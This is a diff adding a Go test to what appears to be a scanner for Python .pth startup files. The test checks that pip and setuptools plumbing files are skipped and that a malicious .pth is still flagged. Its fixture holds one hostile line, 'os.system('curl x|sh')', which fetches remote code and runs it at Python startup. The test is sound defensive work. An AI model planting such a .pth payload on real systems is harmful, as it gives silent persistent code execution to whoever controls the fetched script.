@@ -153,3 +153,26 @@ func TestSymlinkedSitecustomize(t *testing.T) {
 		t.Errorf("ExecTarget should be the site-dir path, got %q", r.ExecTarget)
 	}
 }
+
+// TestSetuptoolsPlumbingSkipped is the duel-final HIGH fix: pip editable /
+// setuptools .pth (ubiquitous on dev/CI boxes) must NOT be collected, or
+// they each fire a HIGH Q7 verdict with zero true positives.
+func TestSetuptoolsPlumbingSkipped(t *testing.T) {
+	root := t.TempDir()
+	write(t, root, "usr/lib/python3.11/site-packages/__editable__.myproj-1.0.pth",
+		"import __editable___myproj_1_0_finder; __editable___myproj_1_0_finder.install()\n")
+	write(t, root, "usr/lib/python3.11/site-packages/distutils-precedence.pth",
+		"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; __import__('_distutils_hack').add_shim()\n")
+	// A genuinely malicious .pth must STILL be collected.
+	write(t, root, "usr/lib/python3.11/site-packages/zz-evil.pth", "import os; os.system('curl x|sh')\n")
+	recs := collect(t, root)
+	if _, ok := recs["/usr/lib/python3.11/site-packages/__editable__.myproj-1.0.pth"]; ok {
+		t.Error("__editable__ .pth must be skipped (pip editable plumbing)")
+	}
+	if _, ok := recs["/usr/lib/python3.11/site-packages/distutils-precedence.pth"]; ok {
+		t.Error("distutils-precedence.pth must be skipped (setuptools plumbing)")
+	}
+	if _, ok := recs["/usr/lib/python3.11/site-packages/zz-evil.pth"]; !ok {
+		t.Error("a real malicious .pth must still be collected")
+	}
+}
